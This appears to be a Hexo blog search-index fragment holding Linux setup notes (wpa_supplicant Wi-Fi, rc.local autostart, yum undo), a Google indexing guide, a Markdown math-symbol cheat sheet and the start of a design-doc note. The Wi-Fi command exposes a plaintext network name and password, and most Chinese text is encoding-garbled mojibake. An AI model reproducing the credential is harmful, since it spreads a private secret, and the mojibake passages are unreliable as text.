<h2 id="è¿æ¥WIFIåŠé…ç½®åˆç›–ä¸æ–­ç½‘"><a href="#è¿æ¥WIFIåŠé…ç½®åˆç›–ä¸æ–­ç½‘" class="headerlink" title="è¿æ¥WIFIåŠé…ç½®åˆç›–ä¸æ–­ç½‘"></a>è¿æ¥WIFIåŠé…ç½®åˆç›–ä¸æ–­ç½‘</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpa_passphrase &quot;Ziroom-702_5G&quot; &quot;4001001111&quot; &gt; /etc/wpa_supplicant/Ziroom-702_5G.conf</span><br><span class="line"></span><br><span class="line">vi /root/autostart/.sh</span><br><span class="line"><span class="meta"># </span><span class="language-bash">wlo1 ä¸ºwifiç½‘å¡</span></span><br><span class="line">wpa_supplicant -B -i wlo1 -c /etc/wpa_supplicant/Ziroom-702_5G.conf</span><br><span class="line"></span><br><span class="line">dhclient wlo1</span><br><span class="line"></span><br><span class="line">chmod +x /root/autostart.sh</span><br><span class="line"></span><br><span class="line">touch /etc/rc.local</span><br><span class="line">chmod +x /etc/rc.local</span><br><span class="line">vi /etc/rc.local</span><br><span class="line"><span class="meta"># </span><span class="language-bash">åœ¨æœ€åä¸€è¡ŒåŠ å…¥autostart.shçš„è·¯å¾„</span></span><br><span class="line">/root/autostart.sh</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç¬”è®°æœ¬åˆä½ä¸æ–­ç½‘é…ç½®</span></span><br><span class="line">vi /etc/systemd/logind.conf</span><br><span class="line"></span><br><span class="line">HandleLidSwitch=lock  </span><br><span class="line"></span><br><span class="line">systemctl restart systemd-logind</span><br></pre></td></tr></table></figure>



<h2 id="yumå®‰è£…çš„è½¯ä»¶undo"><a href="#yumå®‰è£…çš„è½¯ä»¶undo" class="headerlink" title="yumå®‰è£…çš„è½¯ä»¶undo"></a>yumå®‰è£…çš„è½¯ä»¶undo</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">Get all yum commands previously run</span></span><br><span class="line">yum history list all</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Get the details of the <span class="built_in">command</span></span></span><br><span class="line">yum history info [entry number]</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Undo each <span class="built_in">command</span> top-down</span></span><br><span class="line">yum history undo [entry number]</span><br></pre></td></tr></table></figure>



<h1 id="è®©Googleæœç´¢åˆ°è‡ªå·±çš„åšå®¢"><a href="#è®©Googleæœç´¢åˆ°è‡ªå·±çš„åšå®¢" class="headerlink" title="è®©Googleæœç´¢åˆ°è‡ªå·±çš„åšå®¢"></a>è®©Googleæœç´¢åˆ°è‡ªå·±çš„åšå®¢</h1><h2 id="æŸ¥çœ‹ç½‘ç«™æ˜¯å¦è¢«æ”¶å½•"><a href="#æŸ¥çœ‹ç½‘ç«™æ˜¯å¦è¢«æ”¶å½•" class="headerlink" title="æŸ¥çœ‹ç½‘ç«™æ˜¯å¦è¢«æ”¶å½•"></a>æŸ¥çœ‹ç½‘ç«™æ˜¯å¦è¢«æ”¶å½•</h2><p>ç”¨googleæœç´¢ï¼Œæ¥æŸ¥çœ‹ä¸€ä¸‹è‡ªå·±çš„ç½‘ç«™æ˜¯å¦è¢«æ”¶å½•äº†ï¼Œåœ¨è¾“å…¥æ¡†è¾“å…¥å¦‚ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:https://mingwzi.cn</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­åé¢çš„è¿æ¥<a href="http://mingwzi.cnå°±æ˜¯è‡ªå·±çš„ç½‘ç«™åœ°å€,å¦‚æœæŸ¥çœ‹çš„ç»“æœæ˜¯æ²¡æœ‰æ˜¾ç¤ºè‡ªå·±ç½‘ç«™ç›¸å…³çš„å†…å®¹çš„æ—¶å€™,ä¹Ÿå°±æ˜¯è¯´æ˜è‡ªå·±çš„ç½‘ç«™æ˜¯æ²¡æœ‰è¢«æ”¶å½•çš„.å¦‚æœè¢«æ”¶å½•äº†,é‚£ä¹ˆå°±ä¸ç”¨çœ‹ä¸‹é¢çš„æ­¥éª¤äº†./">http://mingwzi.cnå°±æ˜¯è‡ªå·±çš„ç½‘ç«™åœ°å€ï¼Œå¦‚æœæŸ¥çœ‹çš„ç»“æœæ˜¯æ²¡æœ‰æ˜¾ç¤ºè‡ªå·±ç½‘ç«™ç›¸å…³çš„å†…å®¹çš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯è¯´æ˜è‡ªå·±çš„ç½‘ç«™æ˜¯æ²¡æœ‰è¢«æ”¶å½•çš„ã€‚å¦‚æœè¢«æ”¶å½•äº†ï¼Œé‚£ä¹ˆå°±ä¸ç”¨çœ‹ä¸‹é¢çš„æ­¥éª¤äº†ã€‚</a></p>
<h2 id="æäº¤æœç´¢èµ„æº"><a href="#æäº¤æœç´¢èµ„æº" class="headerlink" title="æäº¤æœç´¢èµ„æº"></a>æäº¤æœç´¢èµ„æº</h2><p>ç‚¹å‡»<a href="https://search.google.com/search-console?hl=zh">Google Search Console</a>ï¼Œæ³¨æ„ï¼šè¿™é‡Œéœ€è¦ç”¨Googleè´¦å·æ¥ç™»å½•ã€‚</p>
<p>ç‚¹å‡»å·¦ä¸Šè§’çš„æ·»åŠ èµ„æº</p>
<p>è¿™é‡Œé€‰æ‹©å‰ç¼€ï¼Œç„¶åè¾“å…¥è‡ªå·±ç½‘ç«™åœ°å€ã€‚ç„¶åä¼šç”Ÿæˆä¸€ä¸ªhtmlæ–‡ä»¶ï¼Œå°†è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ åˆ°è‡ªå·±çš„ç½‘ç«™æ ¹ç›®å½•ä¸‹å³å¯ã€‚è¿™é‡Œæˆ‘æ˜¯å·²ç»ä¸Šä¼ è¿‡äº†ï¼Œç„¶åå‡ºç°ä¸‹é¢çš„æ˜¾ç¤ºç»“æœã€‚</p>
<h2 id="æ·»åŠ ç«™ç‚¹åœ°å›¾"><a href="#æ·»åŠ ç«™ç‚¹åœ°å›¾" class="headerlink" title="æ·»åŠ ç«™ç‚¹åœ°å›¾"></a>æ·»åŠ ç«™ç‚¹åœ°å›¾</h2><p>ç«™ç‚¹åœ°å›¾(Site Map)æ˜¯ç”¨æ¥æ³¨æ˜ç½‘ç«™ç»“æ„çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬å¸Œæœ›æœç´¢å¼•æ“çš„çˆ¬è™«äº†è§£æˆ‘ä»¬çš„ç½‘ç«™ç»“æ„,ä»¥ä¾¿äºé«˜æ•ˆçˆ¬å–å†…å®¹ï¼Œå¿«é€Ÿå»ºç«‹ç´¢å¼•ã€‚</p>
<ol>
<li><p>ç‚¹å‡»è¿›å…¥ XML-Sitemaps.com é¡µé¢ï¼Œè¾“å…¥åšå®¢åœ°å€ï¼Œç‚¹å‡» startã€‚</p>
</li>
<li><p>ç­‰å¾…æœç´¢å®Œæˆï¼Œç‚¹å‡» VIEW SITEMAP DETAILSã€‚</p>
</li>
<li><p>ä¸‹è½½ SITEMAP æ–‡ä»¶sitemap.xmlå¹¶å°†å…¶ä¸Šä¼ åˆ°ç½‘ç«™çš„æ ¹ç›®å½•ã€‚</p>
</li>
</ol>
<blockquote>
<p>å…¶å®è‡ªå·±å¯ä»¥æ‰“å¼€è¿™ä¸ªæ–‡ä»¶å¯ä»¥æŸ¥çœ‹ä¸€ä¸‹ï¼Œå…¶å®ä¹Ÿå°±æ˜¯è‡ªå·±çš„ä¸€äº›åšå®¢çš„é“¾æ¥ã€‚</p>
</blockquote>
<ol start="4">
<li>æ¥ä¸‹æ¥å°±æ˜¯æŠŠä¸‹è½½çš„è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ åˆ°è‡ªå·±çš„ç½‘ç«™æ ¹ç›®å½•ä¸‹ã€‚</li>
</ol>
<h2 id="åˆ°Google-Search-Consoleæäº¤ç«™ç‚¹åœ°å›¾"><a href="#åˆ°Google-Search-Consoleæäº¤ç«™ç‚¹åœ°å›¾" class="headerlink" title="åˆ°Google Search Consoleæäº¤ç«™ç‚¹åœ°å›¾"></a>åˆ°Google Search Consoleæäº¤ç«™ç‚¹åœ°å›¾</h2><p>æ‰“å¼€Google Search Consoleç½‘ç«™ï¼Œç„¶åé€‰æ‹©å·¦ä¾§æ é€‰æ‹©<strong>ç«™ç‚¹åœ°å›¾</strong>ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œç„¶åè¾“å…¥<code>sitemap.xml</code>ï¼Œç‚¹å‡»æäº¤ã€‚</p>
<p>ä¹‹åï¼Œå°±ä¼šæ˜¾ç¤ºç«™ç‚¹åœ°å›¾æäº¤æˆåŠŸã€‚</p>
<p>ä½†æ˜¯ï¼Œå‘ç°å¦‚æœå†æ¬¡åœ¨googleæœç´¢æ¡†ä¸­è¾“å…¥site:http&#x2F;&#x2F;mingwzi.cnå‘ç°è¿˜æ˜¯å‡ºç°ä¸€æ ·çš„ç»“æœï¼Œè¿™æ˜¯å› ä¸ºè¦ç­‰çš„googleä¸‹ä¸€æ¬¡æ›´æ–°ç´¢å¼•çš„æ—¶å€™æ‰ä¼šå°†ä½ æ·»åŠ çš„å†…å®¹æ”¶å½•è¿›å»çš„ã€‚</p>
<h2 id="æ‰‹åŠ¨è¯·æ±‚ï¼ˆé‡æ–°ï¼‰ç¼–å…¥ç´¢å¼•"><a href="#æ‰‹åŠ¨è¯·æ±‚ï¼ˆé‡æ–°ï¼‰ç¼–å…¥ç´¢å¼•" class="headerlink" title="æ‰‹åŠ¨è¯·æ±‚ï¼ˆé‡æ–°ï¼‰ç¼–å…¥ç´¢å¼•"></a>æ‰‹åŠ¨è¯·æ±‚ï¼ˆé‡æ–°ï¼‰ç¼–å…¥ç´¢å¼•</h2><p>ç¼–å…¥ç´¢å¼•å¯èƒ½éœ€è¦é•¿è¾¾ 1-2 å‘¨çš„æ—¶é—´ï¼Œè¿™ä¸ªå¯¹äºæœ‰äº›åšå®¢ä¸»æ˜¯æ¥å—ä¸äº†çš„ï¼Œå½“ç„¶å¯ä»¥è‡ªå·±æ‰‹åŠ¨å»æ·»åŠ è¦æ±‚ç¼–å…¥ç´¢å¼•ã€‚å½“ç„¶ä¸ä¸€å®šæœ‰æ•ˆï¼Œä¸è¿‡è‚¯å®šæ˜¯æ¯”è¢«åŠ¨æ·»åŠ æœç´¢æ˜¯å¿«ä¸€äº›çš„ã€‚é‚£ä¹ˆå¦‚ä½•æ“ä½œçš„å‘¢ã€‚</p>
<p>æˆ‘ä»¬ç»§ç»­æ¥åˆ°Google Search Consoleç•Œé¢ï¼Œç„¶åç‚¹å‡»å·¦ä¾§æ çš„<strong>ç½‘ç«™æ£€æµ‹</strong>ï¼Œç„¶åè¾“å…¥è‡ªå·±çš„æŸä¸€ä¸ªåšå®¢çš„å®Œæ•´çš„åœ°å€ï¼Œç„¶åå›è½¦ã€‚</p>
<p>ç„¶åå°±ä¼šæ˜¾ç¤º<strong>è¯·æ±‚ç¼–å…¥ç´¢å¼•</strong>ï¼Œç‚¹å‡»ç¼–å…¥å³å¯ã€‚</p>
]]></content>
      <categories>
        <category>chaos</category>
      </categories>
      <tags>
        <tag>chaos</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown æ•™ç¨‹</title>
    <url>/2021/12/21/Chaos/Markdown/</url>
    <content><![CDATA[<h1 id="Markdown-æ•™ç¨‹"><a href="#Markdown-æ•™ç¨‹" class="headerlink" title="Markdown æ•™ç¨‹"></a>Markdown æ•™ç¨‹</h1><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211234999.png" alt="img"></p>
<p>Markdown æ˜¯ä¸€ç§è½»é‡çº§æ ‡è®°è¯­è¨€ï¼Œå®ƒå…è®¸äººä»¬ä½¿ç”¨æ˜“è¯»æ˜“å†™çš„çº¯æ–‡æœ¬æ ¼å¼ç¼–å†™æ–‡æ¡£ã€‚</p>
<p>Markdown è¯­è¨€åœ¨ 2004 ç”±çº¦ç¿°Â·æ ¼é²ä¼¯ï¼ˆè‹±è¯­ï¼šJohn Gruberï¼‰åˆ›å»ºã€‚</p>
<p>Markdown ç¼–å†™çš„æ–‡æ¡£å¯ä»¥å¯¼å‡º HTML ã€Wordã€å›¾åƒã€PDFã€Epub ç­‰å¤šç§æ ¼å¼çš„æ–‡æ¡£ã€‚</p>
<p>Markdown ç¼–å†™çš„æ–‡æ¡£åç¼€ä¸º <strong>.md</strong>, <strong>.markdown</strong>ã€‚</p>
<h2 id="Markdown-æ•°å­¦å…¬å¼"><a href="#Markdown-æ•°å­¦å…¬å¼" class="headerlink" title="Markdown æ•°å­¦å…¬å¼"></a>Markdown æ•°å­¦å…¬å¼</h2><h2 id="ä¸Š-x2F-ä¸‹æ ‡"><a href="#ä¸Š-x2F-ä¸‹æ ‡" class="headerlink" title="ä¸Š&#x2F;ä¸‹æ ‡"></a><strong>ä¸Š&#x2F;ä¸‹æ ‡</strong></h2><table>
<thead>
<tr>
<th>ç®—å¼</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$x^2 $</td>
<td>x^2</td>
</tr>
<tr>
<td>$y_1 $</td>
<td>y_1</td>
</tr>
</tbody></table>
<h2 id="åˆ†å¼"><a href="#åˆ†å¼" class="headerlink" title="åˆ†å¼"></a><strong>åˆ†å¼</strong></h2><table>
<thead>
<tr>
<th>ç®—å¼</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>1&#x2F;2</td>
<td>1&#x2F;2</td>
</tr>
<tr>
<td>$\frac{1}{2}$</td>
<td>\frac{1}{2}</td>
</tr>
</tbody></table>
<h2 id="çœç•¥å·"><a href="#çœç•¥å·" class="headerlink" title="çœç•¥å·"></a><strong>çœç•¥å·</strong></h2><table>
<thead>
<tr>
<th>çœç•¥å·</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\cdots$</td>
<td>\cdots</td>
</tr>
</tbody></table>
<h2 id="å¼€æ ¹å·"><a href="#å¼€æ ¹å·" class="headerlink" title="å¼€æ ¹å·"></a><strong>å¼€æ ¹å·</strong></h2><table>
<thead>
<tr>
<th>ç®—å¼</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\sqrt{2}$</td>
<td>\sqrt{2}</td>
</tr>
</tbody></table>
<h2 id="çŸ¢é‡"><a href="#çŸ¢é‡" class="headerlink" title="çŸ¢é‡"></a><strong>çŸ¢é‡</strong></h2><table>
<thead>
<tr>
<th>ç®—å¼</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\vec{a}$</td>
<td>\vec{a}</td>
</tr>
</tbody></table>
<h2 id="ç§¯åˆ†"><a href="#ç§¯åˆ†" class="headerlink" title="ç§¯åˆ†"></a><strong>ç§¯åˆ†</strong></h2><table>
<thead>
<tr>
<th>ç®—å¼</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\int{x}dx$</td>
<td>\int{x}dx</td>
</tr>
<tr>
<td>$\int_{1}^{2}{x}dx$</td>
<td>\int_{1}^{2}{x}dx</td>
</tr>
</tbody></table>
<h2 id="æé™"><a href="#æé™" class="headerlink" title="æé™"></a><strong>æé™</strong></h2><table>
<thead>
<tr>
<th>ç®—å¼</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\lim{a+b}$</td>
<td>\lim{a+b}</td>
</tr>
<tr>
<td>$\lim_\limits{n\rightarrow+\infty}$</td>
<td>\lim_{n\rightarrow+\infty}</td>
</tr>
</tbody></table>
<h2 id="ç´¯åŠ "><a href="#ç´¯åŠ " class="headerlink" title="ç´¯åŠ "></a><strong>ç´¯åŠ </strong></h2><table>
<thead>
<tr>
<th>ç®—å¼</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\sum{a}$</td>
<td>\sum{a}</td>
</tr>
<tr>
<td>$\sum_{n&#x3D;1}^{100}{a_n}$</td>
<td>\sum_{n&#x3D;1}^{100}{a_n}</td>
</tr>
</tbody></table>
<h2 id="ç´¯ä¹˜"><a href="#ç´¯ä¹˜" class="headerlink" title="ç´¯ä¹˜"></a><strong>ç´¯ä¹˜</strong></h2><table>
<thead>
<tr>
<th>ç®—å¼</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\prod{x}$</td>
<td>\prod{x}</td>
</tr>
<tr>
<td>$\prod_{n&#x3D;1}^{99}{x_n}$</td>
<td>\prod_{n&#x3D;1}^{99}{x_n}</td>
</tr>
</tbody></table>
<h2 id="å¸Œè…Šå­—æ¯"><a href="#å¸Œè…Šå­—æ¯" class="headerlink" title="å¸Œè…Šå­—æ¯"></a><strong>å¸Œè…Šå­—æ¯</strong></h2><table>
<thead>
<tr>
<th>å¤§å†™</th>
<th>Markdown</th>
<th>å°å†™</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$A$</td>
<td>A</td>
<td>$\alpha$</td>
<td>\alpha</td>
</tr>
<tr>
<td>$B$</td>
<td>B</td>
<td>$\beta$</td>
<td>\beta</td>
</tr>
<tr>
<td>$\Gamma$</td>
<td>\Gamma</td>
<td>$\gamma$</td>
<td>\gamma</td>
</tr>
<tr>
<td>$\Delta$</td>
<td>\Delta</td>
<td>$\delta$</td>
<td>\delta</td>
</tr>
<tr>
<td>$E$</td>
<td>E</td>
<td>$\epsilon$</td>
<td>\epsilon</td>
</tr>
<tr>
<td></td>
<td></td>
<td>$\varepsilon$</td>
<td>\varepsilon</td>
</tr>
<tr>
<td>$Z$</td>
<td>Z</td>
<td>$\zeta$</td>
<td>\zeta</td>
</tr>
<tr>
<td>$H$</td>
<td>H</td>
<td>$\eta$</td>
<td>\eta</td>
</tr>
<tr>
<td>$\Theta$</td>
<td>\Theta</td>
<td>$\theta$</td>
<td>\theta</td>
</tr>
<tr>
<td>$I$</td>
<td>I</td>
<td>$\iota$</td>
<td>\iota</td>
</tr>
<tr>
<td>$K$</td>
<td>K</td>
<td>$\kappa$</td>
<td>\kappa</td>
</tr>
<tr>
<td>$\Lambda$</td>
<td>\Lambda</td>
<td>$\lambda$</td>
<td>\lambda</td>
</tr>
<tr>
<td>$M$</td>
<td>M</td>
<td>$\mu$</td>
<td>\mu</td>
</tr>
<tr>
<td>$N$</td>
<td>N</td>
<td>$\nu$</td>
<td>\nu</td>
</tr>
<tr>
<td>$\Xi$</td>
<td>\Xi</td>
<td>$\xi$</td>
<td>\xi</td>
</tr>
<tr>
<td>$O$</td>
<td>O</td>
<td>$\omicron$</td>
<td>\omicron</td>
</tr>
<tr>
<td>$\Pi$</td>
<td>\Pi</td>
<td>$\pi$</td>
<td>\pi</td>
</tr>
<tr>
<td>$P$</td>
<td>P</td>
<td>$\rho$</td>
<td>\rho</td>
</tr>
<tr>
<td>$\Sigma$</td>
<td>\Sigma</td>
<td>$\sigma$</td>
<td>\sigma</td>
</tr>
<tr>
<td>$T$</td>
<td>T</td>
<td>$\tau$</td>
<td>\tau</td>
</tr>
<tr>
<td>$\Upsilon$</td>
<td>\Upsilon</td>
<td>$\upsilon$</td>
<td>\upsilon</td>
</tr>
<tr>
<td>$\Phi$</td>
<td>\Phi</td>
<td>$\phi$</td>
<td>\phi</td>
</tr>
<tr>
<td></td>
<td></td>
<td>$\varphi$</td>
<td>\varphi</td>
</tr>
<tr>
<td>$X$</td>
<td>X</td>
<td>$\chi$</td>
<td>\chi</td>
</tr>
<tr>
<td>$\Psi$</td>
<td>\Psi</td>
<td>$\psi$</td>
<td>\psi</td>
</tr>
<tr>
<td>$\Omega$</td>
<td>\Omega</td>
<td>$\omega$</td>
<td>\omega</td>
</tr>
</tbody></table>
<h2 id="ä¸‰è§’å‡½æ•°"><a href="#ä¸‰è§’å‡½æ•°" class="headerlink" title="ä¸‰è§’å‡½æ•°"></a>ä¸‰è§’å‡½æ•°</h2><table>
<thead>
<tr>
<th>ä¸‰è§’å‡½æ•°</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\sin$</td>
<td>\sin</td>
</tr>
</tbody></table>
<h2 id="å¯¹æ•°å‡½æ•°"><a href="#å¯¹æ•°å‡½æ•°" class="headerlink" title="å¯¹æ•°å‡½æ•°"></a><strong>å¯¹æ•°å‡½æ•°</strong></h2><table>
<thead>
<tr>
<th>ç®—å¼</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\ln2$</td>
<td>\ln2</td>
</tr>
<tr>
<td>$\log_28$</td>
<td>\log_28</td>
</tr>
<tr>
<td>$\lg10$</td>
<td>\lg10</td>
</tr>
</tbody></table>
<h2 id="å…³ç³»è¿ç®—ç¬¦"><a href="#å…³ç³»è¿ç®—ç¬¦" class="headerlink" title="å…³ç³»è¿ç®—ç¬¦"></a><strong>å…³ç³»è¿ç®—ç¬¦</strong></h2><table>
<thead>
<tr>
<th>è¿ç®—ç¬¦</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\pm$</td>
<td>\pm</td>
</tr>
<tr>
<td>$\times$</td>
<td>\times</td>
</tr>
<tr>
<td>$\cdot$</td>
<td>\cdot</td>
</tr>
<tr>
<td>$\div$</td>
<td>\div</td>
</tr>
<tr>
<td>$\neq$</td>
<td>\neq</td>
</tr>
<tr>
<td>$\equiv$</td>
<td>\equiv</td>
</tr>
<tr>
<td>$\leq$</td>
<td>\leq</td>
</tr>
<tr>
<td>$\geq$</td>
<td>\geq</td>
</tr>
<tr>
<td>$\approx$</td>
<td>\approx</td>
</tr>
</tbody></table>
<h2 id="å…¶å®ƒç‰¹æ®Šå­—ç¬¦"><a href="#å…¶å®ƒç‰¹æ®Šå­—ç¬¦" class="headerlink" title="å…¶å®ƒç‰¹æ®Šå­—ç¬¦"></a><strong>å…¶å®ƒç‰¹æ®Šå­—ç¬¦</strong></h2><table>
<thead>
<tr>
<th>ç¬¦å·</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\forall$</td>
<td>\forall</td>
</tr>
<tr>
<td>$\infty$</td>
<td>\infty</td>
</tr>
<tr>
<td>$\emptyset$</td>
<td>\emptyset</td>
</tr>
<tr>
<td>$\exists$</td>
<td>\exists</td>
</tr>
<tr>
<td>$\nabla$</td>
<td>\nabla</td>
</tr>
<tr>
<td>$\bot$</td>
<td>\bot</td>
</tr>
<tr>
<td>$\angle$</td>
<td>\angle</td>
</tr>
<tr>
<td>$\because$</td>
<td>\because</td>
</tr>
<tr>
<td>$\therefore$</td>
<td>\therefore</td>
</tr>
<tr>
<td>$\lceil$</td>
<td>\lceil</td>
</tr>
<tr>
<td>$\rceil$</td>
<td>\rceil</td>
</tr>
<tr>
<td>$\lfloor$</td>
<td>\lfloor</td>
</tr>
<tr>
<td>$\rfloor$</td>
<td>\rfloor</td>
</tr>
</tbody></table>
<h2 id="çŸ©é˜µ"><a href="#çŸ©é˜µ" class="headerlink" title="çŸ©é˜µ"></a>çŸ©é˜µ</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">a = \left[</span><br><span class="line">\matrix&#123;</span><br><span class="line">  \alpha_1 &amp; test1\\</span><br><span class="line">  \alpha_2 &amp; test2\\</span><br><span class="line">  \alpha_3 &amp; test3 </span><br><span class="line">&#125;</span><br><span class="line">\right]</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>

<p>$$<br>a &#x3D; \left(<br>\matrix{<br>  \alpha_1 &amp; test1\<br>  \alpha_2 &amp; test2\<br>  \alpha_3 &amp; test3<br>}<br>\right)<br>$$</p>
<h2 id="ç¦»æ•£æ•°å­¦"><a href="#ç¦»æ•£æ•°å­¦" class="headerlink" title="ç¦»æ•£æ•°å­¦"></a>ç¦»æ•£æ•°å­¦</h2><table>
<thead>
<tr>
<th>ç¬¦å·</th>
<th>markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\leftrightarrow$</td>
<td>\leftrightarrow</td>
</tr>
<tr>
<td>$\leftarrow$</td>
<td>\leftarrow</td>
</tr>
<tr>
<td>$\rightarrow$</td>
<td>\rightarrow</td>
</tr>
<tr>
<td>$\Leftrightarrow$</td>
<td>\Leftrightarrow</td>
</tr>
<tr>
<td>$\Rightarrow$</td>
<td>\Rightarrow</td>
</tr>
<tr>
<td>$\Leftarrow$</td>
<td>\Leftarrow</td>
</tr>
<tr>
<td>$\neg$</td>
<td>\neg</td>
</tr>
<tr>
<td>$\cup$</td>
<td>\cup</td>
</tr>
<tr>
<td>$\cap$</td>
<td>\cap</td>
</tr>
<tr>
<td>$\and$</td>
<td>\and</td>
</tr>
<tr>
<td>$\or$</td>
<td>\or</td>
</tr>
<tr>
<td>$\subset$</td>
<td>\subset</td>
</tr>
<tr>
<td>$\supset$</td>
<td>\supset</td>
</tr>
<tr>
<td>$\subseteq$</td>
<td>\subseteq</td>
</tr>
<tr>
<td>$\supseteq$</td>
<td>\supseteq</td>
</tr>
<tr>
<td>$\in$</td>
<td>\in</td>
</tr>
<tr>
<td>$\notin$</td>
<td>\notin</td>
</tr>
<tr>
<td>$\ni$</td>
<td>\ni</td>
</tr>
<tr>
<td>$\oplus$</td>
<td>\oplus</td>
</tr>
<tr>
<td>$\Pi$</td>
<td>\Pi</td>
</tr>
<tr>
<td>$\Sigma$</td>
<td>\sigma</td>
</tr>
<tr>
<td>$\ge$</td>
<td>\ge</td>
</tr>
<tr>
<td>$\le$</td>
<td>\le</td>
</tr>
<tr>
<td>$\forall$</td>
<td>\forall</td>
</tr>
<tr>
<td>$\exist$</td>
<td>\exist</td>
</tr>
<tr>
<td>$\sigma$</td>
<td>\sigma</td>
</tr>
<tr>
<td>$\neq$</td>
<td>\neq</td>
</tr>
<tr>
<td>$\emptyset$</td>
<td>\emptyset</td>
</tr>
<tr>
<td>$\bar{A}$</td>
<td>\bar{A}</td>
</tr>
<tr>
<td>$\odot$</td>
<td>\odot</td>
</tr>
<tr>
<td>$\circ$</td>
<td>\circ</td>
</tr>
<tr>
<td>$\cong$</td>
<td>\cong</td>
</tr>
<tr>
<td>$\Omega$</td>
<td>\Omega</td>
</tr>
<tr>
<td>$\infty$</td>
<td>\infty</td>
</tr>
<tr>
<td>$\overline{x+y}$</td>
<td>\overline</td>
</tr>
<tr>
<td>$\underline{x+y}$</td>
<td>\underline</td>
</tr>
<tr>
<td>$\cdots$</td>
<td>\cdots</td>
</tr>
<tr>
<td>$a\qquad b$</td>
<td>\qquad</td>
</tr>
<tr>
<td>$\ast$</td>
<td>\ast</td>
</tr>
<tr>
<td>$\cdot$</td>
<td>\cdot</td>
</tr>
<tr>
<td>$\bullet$</td>
<td>\bullet</td>
</tr>
<tr>
<td>$\lhd$</td>
<td>\lhd</td>
</tr>
<tr>
<td>$\unlhd$</td>
<td>\unlhd</td>
</tr>
<tr>
<td>$\rhd$</td>
<td>\rhd</td>
</tr>
<tr>
<td>$\unrhd$</td>
<td>\unrhd</td>
</tr>
</tbody></table>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211234015.jpg" alt="img"></p>
]]></content>
      <categories>
        <category>chaos</category>
      </categories>
      <tags>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>Design Doc Readability</title>
    <url>/2021/12/21/Chaos/Design%20Doc%20Readability/</url>
    <content><![CDATA[<h1 id="Design-Doc-Readability"><a href="#Design-Doc-Readability" class="headerlink" title="Design Doc Readability"></a>Design Doc Readability</h1><p><a href="https://to.woa.com/read-dd">https://to.woa.com/read-dd</a></p>
<h1 id="What-is-a-Design-Doc"><a href="#What-is-a-Design-Doc" class="headerlink" title="What is a Design Doc?"></a><strong>What is a Design Doc?</strong></h1><p>è®¾è®¡æ–‡æ¡£æ˜¯å¯¹ä¸€ä¸ªæŠ€æœ¯é—®é¢˜çš„è§£å†³æ–¹æ¡ˆçš„ç³»ç»Ÿæ€§æè¿°ã€‚</p>
<h1 id="Why-writing-Design-Docs"><a href="#Why-writing-Design-Docs" class="headerlink" title="Why writing Design Docs?"></a><strong>Why writing Design Docs?</strong></h1><ul>
<li>æ˜¯å¦æœ‰å¿…è¦èŠ±è´¹å‰æœŸæ—¶é—´æ¥å¢åŠ æ­£ç¡®è®¾è®¡è½¯ä»¶çš„ç¡®å®šæ€§ï¼Ÿ</li>
<li>ä¸æ­¤ç›¸å…³çš„æ˜¯ï¼Œç”±äºé«˜çº§å·¥ç¨‹å¸ˆæ— æ³•ç¡®ä¿èƒ½å¤Ÿå®¡æ ¸æ¯ä¸€æ¬¡ä»£ç å˜æ›´ï¼Œè®©ä»–ä»¬å‚ä¸è®¾è®¡æ˜¯å¦æœ‰å¸®åŠ©ï¼Ÿ</li>
<li>è½¯ä»¶è®¾è®¡æ˜¯æ¨¡æ£±ä¸¤å¯çš„ï¼Œç”šè‡³æ˜¯æœ‰äº‰è®®çš„ï¼Œå› è€Œå›´ç»•è®¾è®¡æ–‡æ¡£åœ¨ç»„ç»‡ä¸Šè¾¾æˆå…±è¯†æ˜¯æœ‰ä»·å€¼çš„ï¼Ÿ</li>
<li>æˆ‘çš„å›¢é˜Ÿæ˜¯å¦ä¼šå¿½ç•¥è®¾è®¡ä¸­çš„éšç§æ€§ã€å®‰å…¨æ€§ã€æ—¥å¿—è®°å½•æˆ–å…¶å®ƒäº¤å‰é—®é¢˜ï¼Ÿ</li>
<li>æ˜¯å¦æœ‰å¿…è¦å†™ä¸€ä»½æ–‡æ¡£æ¥å¯¹ç»„ç»‡ä¸­æœ‰å…³é—ç•™ç³»ç»Ÿçš„è®¾è®¡é—®é¢˜æä¾›é«˜å±‚æ¬¡çš„è§è§£ï¼Ÿ</li>
</ul>
